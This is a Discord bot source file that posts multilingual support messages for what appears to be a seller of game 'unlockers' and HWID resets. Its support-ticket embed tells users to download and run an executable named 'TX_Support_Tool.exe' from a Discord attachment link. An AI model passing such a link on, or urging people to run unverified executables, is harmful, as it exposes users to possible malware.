const { Client, GatewayIntentBits, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const prefix = '.';
const DEV_LOG_CHANNEL_ID = '1414044553312468992';

const commands = [
    new SlashCommandBuilder()
        .setName('allcmds')
        .setDescription('Display all available bot commands (Staff Quick Reference)')
];

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

async function registerCommands() {
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log('Commands registered successfully.');
}

registerCommands().catch(console.error);

client.once('ready', () => {
    console.log(`Bot is ready! Logged in as ${client.user.tag}`);
    client.user.setPresence({
        activities: [{ name: 'Doing things others cant.', type: 4 }],
        status: 'online'
    });
});

function createTranslationButtons() {
    return new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId('translate_en')
                .setLabel('English')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇺🇸'),
            new ButtonBuilder()
                .setCustomId('translate_de')
                .setLabel('Deutsch')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇩🇪'),
            new ButtonBuilder()
                .setCustomId('translate_fr')
                .setLabel('Français')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇫🇷')
        );
}

function createSupportTicketEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('📋 Support Ticket Requirements')
            .setDescription('In order to assist you efficiently, please ensure you provide the following when opening a ticket:')
            .addFields(
                { name: '📹 Required Information', value: '• A clear, high-quality video demonstrating the issue\n• A screenshot of the error message(s)\n• The name of the product you are using\n• The version of Windows you are running\n• A screenshot of each tab within your Windows Security settings' },
                { name: '🔧 Diagnostic Tool', value: 'Run the following diagnostic setup file and provide a screenshot when prompted:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                { name: '⚠️ Important Notes', value: '• Failure to follow these steps may result in delays or prevent us from providing effective support\n• Please ensure all requested information is submitted promptly\n• Once everything is submitted, kindly wait for an administrator to respond\n• Inactivity within the ticket may result in it being automatically closed' }
            )
            .setFooter({ text: 'Support Team • Please follow all requirements' });
    } else if (language === 'de') {
        embed.setTitle('📋 Support-Ticket Anforderungen')
            .setDescription('Um Ihnen effizient zu helfen, stellen Sie bitte beim Öffnen eines Tickets die folgenden Informationen bereit:')
            .addFields(
                { name: '📹 Erforderliche Informationen', value: '• Ein klares, hochwertiges Video, das das Problem demonstriert\n• Ein Screenshot der Fehlermeldung(en)\n• Der Name des Produkts, das Sie verwenden\n• Die Version von Windows, die Sie verwenden\n• Ein Screenshot jedes Tabs in Ihren Windows-Sicherheitseinstellungen' },
                { name: '🔧 Diagnose-Tool', value: 'Führen Sie die folgende Diagnose-Datei aus und stellen Sie einen Screenshot bereit:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                { name: '⚠️ Wichtige Hinweise', value: '• Das Nichtbefolgen dieser Schritte kann zu Verzögerungen führen oder uns daran hindern, effektiven Support zu bieten\n• Bitte stellen Sie sicher, dass alle angeforderten Informationen umgehend übermittelt werden\n• Warten Sie nach der Übermittlung geduldig auf die Antwort eines Administrators\n• Inaktivität im Ticket kann zur automatischen Schließung führen' }
            )
            .setFooter({ text: 'Support Team • Bitte befolgen Sie alle Anforderungen' });
    } else if (language === 'fr') {
        embed.setTitle('📋 Exigences du Ticket de Support')
            .setDescription('Afin de vous aider efficacement, veuillez vous assurer de fournir les éléments suivants lors de l\'ouverture d\'un ticket:')
            .addFields(
                { name: '📹 Informations Requises', value: '• Une vidéo claire et de haute qualité démontrant le problème\n• Une capture d\'écran du/des message(s) d\'erreur\n• Le nom du produit que vous utilisez\n• La version de Windows que vous utilisez\n• Une capture d\'écran de chaque onglet dans vos paramètres de sécurité Windows' },
                { name: '🔧 Outil de Diagnostic', value: 'Exécutez le fichier de configuration de diagnostic suivant et fournissez une capture d\'écran:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                { name: '⚠️ Notes Importantes', value: '• Ne pas suivre ces étapes peut entraîner des retards ou nous empêcher de fournir un support efficace\n• Veuillez vous assurer que toutes les informations demandées sont soumises rapidement\n• Une fois tout soumis, veuillez attendre patiemment qu\'un administrateur réponde\n• L\'inactivité dans le ticket peut entraîner sa fermeture automatique' }
            )
            .setFooter({ text: 'Équipe de Support • Veuillez suivre toutes les exigences' });
    }
    return embed;
}

function createHwidResetEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('🔄 HWID Reset Requirements')
            .setDescription('To assist you with your HWID reset request, please provide the following information:')
            .addFields(
                { name: '📄 Required Documents', value: '• A clear and detailed image of your invoice ID\n• A screenshot or photo of your payment confirmation\n• The email associated with your key\n• The reason you are requesting a reset' },
                { name: '⏳ Processing Time', value: 'Once all required information has been submitted, kindly allow some time for our team to review and respond accordingly.' }
            )
            .setFooter({ text: 'HWID Reset Team • All information is required' });
    } else if (language === 'de') {
        embed.setTitle('🔄 HWID-Reset Anforderungen')
            .setDescription('Um Ihnen bei Ihrer HWID-Reset-Anfrage zu helfen, stellen Sie bitte die folgenden Informationen bereit:')
            .addFields(
                { name: '📄 Erforderliche Dokumente', value: '• Ein klares und detailliertes Bild Ihrer Rechnungs-ID\n• Ein Screenshot oder Foto Ihrer Zahlungsbestätigung\n• Die E-Mail, die mit Ihrem Schlüssel verknüpft ist\n• Der Grund für Ihre Reset-Anfrage' },
                { name: '⏳ Bearbeitungszeit', value: 'Sobald alle erforderlichen Informationen übermittelt wurden, gewähren Sie unserem Team bitte etwas Zeit zur Überprüfung und entsprechenden Antwort.' }
            )
            .setFooter({ text: 'HWID-Reset Team • Alle Informationen sind erforderlich' });
    } else if (language === 'fr') {
        embed.setTitle('🔄 Exigences de Réinitialisation HWID')
            .setDescription('Pour vous aider avec votre demande de réinitialisation HWID, veuillez fournir les informations suivantes:')
            .addFields(
                { name: '📄 Documents Requis', value: '• Une image claire et détaillée de votre ID de facture\n• Une capture d\'écran ou photo de votre confirmation de paiement\n• L\'e-mail associé à votre clé\n• La raison pour laquelle vous demandez une réinitialisation' },
                { name: '⏳ Temps de Traitement', value: 'Une fois que toutes les informations requises ont été soumises, veuillez accorder du temps à notre équipe pour examiner et répondre en conséquence.' }
            )
            .setFooter({ text: 'Équipe de Réinitialisation HWID • Toutes les informations sont requises' });
    }
    return embed;
}

function createHwidResetDoneEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('✅ HWID Reset Completed')
            .setDescription('Your HWID reset has been successfully processed and completed.')
            .addFields(
                { name: '🎯 Status Update', value: 'Your hardware identification has been reset and is now ready for use with your product.' },
                { name: '📝 Next Steps', value: 'You may now proceed to use your product normally. If you experience any further issues, please don\'t hesitate to create a new support ticket.' }
            )
            .setFooter({ text: 'HWID Reset Team • Process Complete' });
    } else if (language === 'de') {
        embed.setTitle('✅ HWID-Reset Abgeschlossen')
            .setDescription('Ihr HWID-Reset wurde erfolgreich verarbeitet und abgeschlossen.')
            .addFields(
                { name: '🎯 Status-Update', value: 'Ihre Hardware-Identifikation wurde zurückgesetzt und ist nun für die Verwendung mit Ihrem Produkt bereit.' },
                { name: '📝 Nächste Schritte', value: 'Sie können Ihr Produkt nun normal verwenden. Sollten Sie weitere Probleme haben, erstellen Sie bitte ein neues Support-Ticket.' }
            )
            .setFooter({ text: 'HWID-Reset Team • Vorgang Abgeschlossen' });
    } else if (language === 'fr') {
        embed.setTitle('✅ Réinitialisation HWID Terminée')
            .setDescription('Votre réinitialisation HWID a été traitée avec succès et terminée.')
            .addFields(
                { name: '🎯 Mise à jour du Statut', value: 'Votre identification matérielle a été réinitialisée et est maintenant prête à être utilisée avec votre produit.' },
                { name: '📝 Prochaines Étapes', value: 'Vous pouvez maintenant utiliser votre produit normalement. Si vous rencontrez d\'autres problèmes, n\'hésitez pas à créer un nouveau ticket de support.' }
            )
            .setFooter({ text: 'Équipe de Réinitialisation HWID • Processus Terminé' });
    }
    return embed;
}

function createTicketDoneEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('🎉 Thank You for Your Business')
            .setDescription('Thank you for shopping with us! We appreciate your trust in our services.')
            .addFields(
                { name: '🔒 Ticket Closure', value: 'This support ticket will be closed shortly. If you need further assistance, please feel free to create a new ticket.' },
                { name: '⭐ Feedback', value: 'We value your experience with us. Thank you for choosing our services!' }
            )
            .setFooter({ text: 'Support Team • Thank you for your business' });
    } else if (language === 'de') {
        embed.setTitle('🎉 Vielen Dank für Ihr Vertrauen')
            .setDescription('Vielen Dank, dass Sie bei uns eingekauft haben! Wir schätzen Ihr Vertrauen in unsere Dienste.')
            .addFields(
                { name: '🔒 Ticket-Schließung', value: 'Dieses Support-Ticket wird in Kürze geschlossen. Wenn Sie weitere Hilfe benötigen, erstellen Sie gerne ein neues Ticket.' },
                { name: '⭐ Feedback', value: 'Wir schätzen Ihre Erfahrung mit uns. Vielen Dank, dass Sie sich für unsere Dienste entschieden haben!' }
            )
            .setFooter({ text: 'Support Team • Vielen Dank für Ihr Vertrauen' });
    } else if (language === 'fr') {
        embed.setTitle('🎉 Merci pour Votre Confiance')
            .setDescription('Merci d\'avoir fait vos achats chez nous! Nous apprécions votre confiance en nos services.')
            .addFields(
                { name: '🔒 Fermeture du Ticket', value: 'Ce ticket de support sera fermé sous peu. Si vous avez besoin d\'une assistance supplémentaire, n\'hésitez pas à créer un nouveau ticket.' },
                { name: '⭐ Commentaires', value: 'Nous valorisons votre expérience avec nous. Merci d\'avoir choisi nos services!' }
            )
            .setFooter({ text: 'Équipe de Support • Merci pour votre confiance' });
    }
    return embed;
}

function createStatusEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('📊 Product Status')
            .setDescription('Check the current status of all our products and services.')
            .addFields(
                { name: '🔗 Status Page', value: '[View Live Status](https://dottyservices.online/status)\nMonitor real-time status updates for all products' },
                { name: '⚠️ Important Notice', value: 'Always check the status page before using any products to ensure optimal performance and avoid potential issues.' }
            )
            .setFooter({ text: 'Status Team • Always check before use' });
    } else if (language === 'de') {
        embed.setTitle('📊 Produktstatus')
            .setDescription('Überprüfen Sie den aktuellen Status aller unserer Produkte und Dienstleistungen.')
            .addFields(
                { name: '🔗 Status-Seite', value: '[Live-Status anzeigen](https://dottyservices.online/status)\nÜberwachen Sie Echtzeit-Status-Updates für alle Produkte' },
                { name: '⚠️ Wichtiger Hinweis', value: 'Überprüfen Sie immer die Status-Seite vor der Verwendung von Produkten, um optimale Leistung zu gewährleisten und potenzielle Probleme zu vermeiden.' }
            )
            .setFooter({ text: 'Status Team • Immer vor Gebrauch prüfen' });
    } else if (language === 'fr') {
        embed.setTitle('📊 Statut des Produits')
            .setDescription('Vérifiez le statut actuel de tous nos produits et services.')
            .addFields(
                { name: '🔗 Page de Statut', value: '[Voir le Statut en Direct](https://dottyservices.online/status)\nSurveiller les mises à jour de statut en temps réel pour tous les produits' },
                { name: '⚠️ Avis Important', value: 'Vérifiez toujours la page de statut avant d\'utiliser des produits pour assurer des performances optimales et éviter des problèmes potentiels.' }
            )
            .setFooter({ text: 'Équipe de Statut • Toujours vérifier avant utilisation' });
    }
    return embed;
}

function createUnlockerHelpEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('🔓 Unlocker Help Guide')
            .setDescription('Need help with the unlocker? Follow our comprehensive video guide.')
            .addFields(
                { name: '🎥 Video Tutorial', value: '[Watch Help Video](https://streamable.com/zn260n)\nStep-by-step instructions for unlocker usage' },
                { name: '📋 Instructions', value: 'Please follow the video tutorial carefully for proper unlocker setup and usage. The video covers all essential steps.' }
            )
            .setFooter({ text: 'Unlocker Support • Follow the video guide' });
    } else if (language === 'de') {
        embed.setTitle('🔓 Unlocker-Hilfe-Leitfaden')
            .setDescription('Benötigen Sie Hilfe mit dem Unlocker? Folgen Sie unserem umfassenden Video-Leitfaden.')
            .addFields(
                { name: '🎥 Video-Tutorial', value: '[Hilfe-Video ansehen](https://streamable.com/zn260n)\nSchritt-für-Schritt-Anleitung für die Unlocker-Nutzung' },
                { name: '📋 Anweisungen', value: 'Bitte folgen Sie dem Video-Tutorial sorgfältig für die ordnungsgemäße Unlocker-Einrichtung und -Nutzung. Das Video deckt alle wesentlichen Schritte ab.' }
            )
            .setFooter({ text: 'Unlocker-Support • Folgen Sie der Video-Anleitung' });
    } else if (language === 'fr') {
        embed.setTitle('🔓 Guide d\'Aide Unlocker')
            .setDescription('Besoin d\'aide avec l\'unlocker? Suivez notre guide vidéo complet.')
            .addFields(
                { name: '🎥 Tutoriel Vidéo', value: '[Regarder la Vidéo d\'Aide](https://streamable.com/zn260n)\nInstructions étape par étape pour l\'utilisation de l\'unlocker' },
                { name: '📋 Instructions', value: 'Veuillez suivre attentivement le tutoriel vidéo pour une configuration et utilisation appropriée de l\'unlocker. La vidéo couvre toutes les étapes essentielles.' }
            )
            .setFooter({ text: 'Support Unlocker • Suivez le guide vidéo' });
    }
    return embed;
}

function createSetupGuideEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('⚙️ Product Setup Guide')
            .setDescription('Complete setup guide for all our products and services.')
            .addFields(
                { name: '📖 Setup Documentation', value: '[View Setup Guide](https://dottyservices.online/setup)\nComprehensive setup instructions for all products' },
                { name: '🔧 Installation Help', value: 'Follow the setup guide carefully for proper installation and configuration of your products.' }
            )
            .setFooter({ text: 'Setup Team • Follow the complete guide' });
    } else if (language === 'de') {
        embed.setTitle('⚙️ Produkt-Setup-Leitfaden')
            .setDescription('Vollständiger Setup-Leitfaden für alle unsere Produkte und Dienstleistungen.')
            .addFields(
                { name: '📖 Setup-Dokumentation', value: '[Setup-Leitfaden anzeigen](https://dottyservices.online/setup)\nUmfassende Setup-Anweisungen für alle Produkte' },
                { name: '🔧 Installationshilfe', value: 'Folgen Sie dem Setup-Leitfaden sorgfältig für die ordnungsgemäße Installation und Konfiguration Ihrer Produkte.' }
            )
            .setFooter({ text: 'Setup Team • Folgen Sie dem vollständigen Leitfaden' });
    } else if (language === 'fr') {
        embed.setTitle('⚙️ Guide de Configuration des Produits')
            .setDescription('Guide de configuration complet pour tous nos produits et services.')
            .addFields(
                { name: '📖 Documentation de Configuration', value: '[Voir le Guide de Configuration](https://dottyservices.online/setup)\nInstructions de configuration complètes pour tous les produits' },
                { name: '🔧 Aide à l\'Installation', value: 'Suivez attentivement le guide de configuration pour une installation et configuration appropriée de vos produits.' }
            )
            .setFooter({ text: 'Équipe de Configuration • Suivez le guide complet' });
    }
    return embed;
}

function createRefundProcessEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('💰 Refund Policy & Process')
            .setDescription('Our refund policy in accordance with EU and German consumer protection laws.')
            .addFields(
                { name: '✅ Eligibility for Refunds', value: '• Digital content not delivered due to technical issues on our side\n• Product is unusable due to technical problems from our end\n• Must be requested within 14 days of purchase' },
                { name: '❌ Refund Limitations', value: '• Refunds are not guaranteed if the product has been accessed, downloaded, or used successfully\n• Must comply with EU Directive 2011/83/EU on Consumer Rights' },
                { name: '📧 How to Request', value: 'Contact us at: dottywotty1234@outlook.com\nInclude your purchase details and reason for refund request' }
            )
            .setFooter({ text: 'Refund Team • EU Consumer Rights Protected' });
    } else if (language === 'de') {
        embed.setTitle('💰 Rückerstattungsrichtlinie & Verfahren')
            .setDescription('Unsere Rückerstattungsrichtlinie in Übereinstimmung mit EU- und deutschen Verbraucherschutzgesetzen.')
            .addFields(
                { name: '✅ Berechtigung für Rückerstattungen', value: '• Digitale Inhalte nicht geliefert aufgrund technischer Probleme unsererseits\n• Produkt ist aufgrund technischer Probleme von unserer Seite unbrauchbar\n• Muss innerhalb von 14 Tagen nach dem Kauf beantragt werden' },
                { name: '❌ Rückerstattungsbeschränkungen', value: '• Rückerstattungen sind nicht garantiert, wenn das Produkt bereits aufgerufen, heruntergeladen oder erfolgreich verwendet wurde\n• Muss der EU-Richtlinie 2011/83/EU über Verbraucherrechte entsprechen' },
                { name: '📧 Wie man anfragt', value: 'Kontaktieren Sie uns unter: dottywotty1234@outlook.com\nFügen Sie Ihre Kaufdetails und den Grund für die Rückerstattungsanfrage bei' }
            )
            .setFooter({ text: 'Rückerstattungsteam • EU-Verbraucherrechte geschützt' });
    } else if (language === 'fr') {
        embed.setTitle('💰 Politique de Remboursement & Processus')
            .setDescription('Notre politique de remboursement conforme aux lois de protection des consommateurs de l\'UE et d\'Allemagne.')
            .addFields(
                { name: '✅ Éligibilité aux Remboursements', value: '• Contenu numérique non livré en raison de problèmes techniques de notre côté\n• Produit inutilisable en raison de problèmes techniques de notre côté\n• Doit être demandé dans les 14 jours suivant l\'achat' },
                { name: '❌ Limitations de Remboursement', value: '• Les remboursements ne sont pas garantis si le produit a été consulté, téléchargé ou utilisé avec succès\n• Doit être conforme à la Directive UE 2011/83/UE sur les droits des consommateurs' },
                { name: '📧 Comment Demander', value: 'Contactez-nous à: dottywotty1234@outlook.com\nIncluez vos détails d\'achat et la raison de la demande de remboursement' }
            )
            .setFooter({ text: 'Équipe de Remboursement • Droits des Consommateurs UE Protégés' });
    }
    return embed;
}

function createEscalatedEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('⬆️ Ticket Escalated')
            .setDescription('Your support ticket has been escalated for specialized assistance.')
            .addFields(
                { name: '🔝 Escalation Notice', value: 'Your ticket has been forwarded to our administrative team and HR department for further review and assistance.' },
                { name: '⏱️ Response Time', value: 'Please allow additional time for our specialized team to review your case thoroughly. You will receive a response as soon as possible.' },
                { name: '📝 Important', value: 'Please do not create additional tickets for this issue. Our team will contact you through this existing ticket.' }
            )
            .setFooter({ text: 'Administrative Team • Escalated for Review' });
    } else if (language === 'de') {
        embed.setTitle('⬆️ Ticket Eskaliert')
            .setDescription('Ihr Support-Ticket wurde für spezialisierte Unterstützung eskaliert.')
            .addFields(
                { name: '🔝 Eskalationshinweis', value: 'Ihr Ticket wurde zur weiteren Überprüfung und Unterstützung an unser Verwaltungsteam und die Personalabteilung weitergeleitet.' },
                { name: '⏱️ Antwortzeit', value: 'Bitte gewähren Sie zusätzliche Zeit, damit unser Spezialistenteam Ihren Fall gründlich überprüfen kann. Sie erhalten schnellstmöglich eine Antwort.' },
                { name: '📝 Wichtig', value: 'Bitte erstellen Sie keine zusätzlichen Tickets für dieses Problem. Unser Team wird Sie über dieses bestehende Ticket kontaktieren.' }
            )
            .setFooter({ text: 'Verwaltungsteam • Zur Überprüfung Eskaliert' });
    } else if (language === 'fr') {
        embed.setTitle('⬆️ Ticket Escaladé')
            .setDescription('Votre ticket de support a été escaladé pour une assistance spécialisée.')
            .addFields(
                { name: '🔝 Avis d\'Escalade', value: 'Votre ticket a été transféré à notre équipe administrative et au département des ressources humaines pour examen et assistance supplémentaires.' },
                { name: '⏱️ Temps de Réponse', value: 'Veuillez accorder du temps supplémentaire à notre équipe spécialisée pour examiner votre cas en détail. Vous recevrez une réponse dès que possible.' },
                { name: '📝 Important', value: 'Veuillez ne pas créer de tickets supplémentaires pour ce problème. Notre équipe vous contactera via ce ticket existant.' }
            )
            .setFooter({ text: 'Équipe Administrative • Escaladé pour Examen' });
    }
    return embed;
}

function createPleaseWaitEmbed(language) {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('⏳ Please Wait')
            .setDescription('Thank you for your patience. No support staff are currently active.')
            .addFields(
                { name: '🕐 Support Hours', value: 'Our support team will be back online shortly. Please wait for a staff member to assist you.' },
                { name: '📝 Important', value: 'Please do not spam or create multiple tickets. Your request has been received and will be handled in order.' }
            )
            .setFooter({ text: 'Support Team • Please Wait for Assistance' });
    } else if (language === 'de') {
        embed.setTitle('⏳ Bitte Warten')
            .setDescription('Vielen Dank für Ihre Geduld. Derzeit ist kein Support-Personal aktiv.')
            .addFields(
                { name: '🕐 Support-Zeiten', value: 'Unser Support-Team wird in Kürze wieder online sein. Bitte warten Sie auf einen Mitarbeiter, der Ihnen hilft.' },
                { name: '📝 Wichtig', value: 'Bitte spammen Sie nicht oder erstellen Sie mehrere Tickets. Ihre Anfrage wurde erhalten und wird der Reihe nach bearbeitet.' }
            )
            .setFooter({ text: 'Support-Team • Bitte Warten auf Unterstützung' });
    } else if (language === 'fr') {
        embed.setTitle('⏳ Veuillez Patienter')
            .setDescription('Merci de votre patience. Aucun membre du support n\'est actuellement actif.')
            .addFields(
                { name: '🕐 Heures de Support', value: 'Notre équipe de support sera de retour en ligne sous peu. Veuillez attendre qu\'un membre du personnel vous aide.' },
                { name: '📝 Important', value: 'Veuillez ne pas spammer ou créer plusieurs tickets. Votre demande a été reçue et sera traitée dans l\'ordre.' }
            )
            .setFooter({ text: 'Équipe de Support • Veuillez Attendre l\'Assistance' });
    }
    return embed;
}

async function logCommand(user, commandName) {
    const devChannel = client.channels.cache.get(DEV_LOG_CHANNEL_ID);
    if (devChannel) {
        const logEmbed = new EmbedBuilder()
            .setColor('#4ECDC4')
            .setTitle('📊 Command Used')
            .addFields(
                { name: '👤 User', value: user.username, inline: true },
                { name: '⚡ Command', value: `.${commandName}`, inline: true }
            )
            .setTimestamp();
        
        devChannel.send({ embeds: [logEmbed] }).catch(() => {});
    }
}

function getCommandType(title) {
    if (title.includes('Support Ticket') || title.includes('Support-Ticket') || title.includes('Ticket de Support')) {
        return 'supportticket';
    } else if (title.includes('HWID Reset') && (title.includes('Completed') || title.includes('Abgeschlossen') || title.includes('Terminée'))) {
        return 'hwidresetdone';
    } else if (title.includes('HWID Reset') || title.includes('HWID-Reset') || title.includes('Réinitialisation HWID')) {
        return 'hwidreset';
    } else if (title.includes('Thank You') || title.includes('Vielen Dank') || title.includes('Merci')) {
        return 'ticketdone';
    } else if (title.includes('Status') || title.includes('Produktstatus') || title.includes('Statut des Produits')) {
        return 'status';
    } else if (title.includes('Unlocker')) {
        return 'unlockerhelp';
    } else if (title.includes('Setup') || title.includes('Configuration')) {
        return 'setupguide';
    } else if (title.includes('Refund') || title.includes('Rückerstattung') || title.includes('Remboursement')) {
        return 'refundprocess';
    } else if (title.includes('Escalated') || title.includes('Eskaliert') || title.includes('Escaladé')) {
        return 'escalated';
    } else if (title.includes('Please Wait') || title.includes('Bitte Warten') || title.includes('Veuillez Patienter')) {
        return 'pleasewait';
    }
    return null;
}

function createEmbed(commandType, language) {
    switch(commandType) {
        case 'supportticket':
            return createSupportTicketEmbed(language);
        case 'hwidreset':
            return createHwidResetEmbed(language);
        case 'hwidresetdone':
            return createHwidResetDoneEmbed(language);
        case 'ticketdone':
            return createTicketDoneEmbed(language);
        case 'status':
            return createStatusEmbed(language);
        case 'unlockerhelp':
            return createUnlockerHelpEmbed(language);
        case 'setupguide':
            return createSetupGuideEmbed(language);
        case 'refundprocess':
            return createRefundProcessEmbed(language);
        case 'escalated':
            return createEscalatedEmbed(language);
        case 'pleasewait':
            return createPleaseWaitEmbed(language);
        default:
            return new EmbedBuilder().setColor('#FFFFFF').setTitle('Error').setDescription('Unknown command type');
    }
}

client.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand() && interaction.commandName === 'allcmds') {
        const embed = new EmbedBuilder()
            .setColor('#FFFFFF')
            .setTitle('🤖 All Bot Commands')
            .setDescription('Complete command list with translation buttons.')
            .addFields(
                { name: '📋 Support Commands', value: '`.supportticket` - Support requirements\n`.hwidreset` - HWID reset requirements\n`.hwidresetdone` - HWID reset completion\n`.ticketdone` - Ticket closure' },
                { name: '🔧 Help Commands', value: '`.status` - Product status\n`.unlockerhelp` - Unlocker guide\n`.setupguide` - Setup documentation\n`.refundprocess` - Refund policy' },
                { name: '⚡ Management Commands', value: '`.escalated` - Escalation notice\n`.pleasewait` - Please wait message\n`.allcmds` - Command list' }
            )
            .setTimestamp();
        await interaction.reply({ embeds: [embed], ephemeral: true }).catch(() => {});
    }

    if (interaction.isButton() && interaction.customId.startsWith('translate_')) {
        const language = interaction.customId.split('_')[1];
        const originalTitle = interaction.message.embeds[0].title;
        const commandType = getCommandType(originalTitle);

        if (commandType) {
            const newEmbed = createEmbed(commandType, language);
            const buttons = createTranslationButtons();
            await interaction.update({ embeds: [newEmbed], components: [buttons] }).catch(() => {});
        }
    }
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;

    const command = message.content.slice(prefix.length).trim().toLowerCase();
    const validCommands = ['supportticket', 'hwidreset', 'hwidresetdone', 'ticketdone', 'status', 'unlockerhelp', 'setupguide', 'refundprocess', 'escalated', 'pleasewait', 'allcmds'];

    if (validCommands.includes(command)) {
        if (command === 'allcmds') {
            const embed = new EmbedBuilder()
                .setColor('#FFFFFF')
                .setTitle('🤖 All Bot Commands')
                .addFields(
                    { name: '📋 Support Commands', value: '`.supportticket` - Support requirements\n`.hwidreset` - HWID reset requirements\n`.hwidresetdone` - HWID reset completion\n`.ticketdone` - Ticket closure' },
                    { name: '🔧 Help Commands', value: '`.status` - Product status\n`.unlockerhelp` - Unlocker guide\n`.setupguide` - Setup documentation\n`.refundprocess` - Refund policy' },
                    { name: '⚡ Management Commands', value: '`.escalated` - Escalation notice\n`.pleasewait` - Please wait message\n`.allcmds` - This list' }
                )
                .setTimestamp();
            
            await message.delete().catch(() => {});
            await message.channel.send({ embeds: [embed] }).catch(() => {});
        } else {
            const embed = createEmbed(command, 'en');
            const buttons = createTranslationButtons();
            
            await message.delete().catch(() => {});
            await message.channel.send({ embeds: [embed], components: [buttons] }).catch(() => {});
        }
        
        logCommand(message.author, command);
    }
});

client.login(process.env.DISCORD_TOKEN);
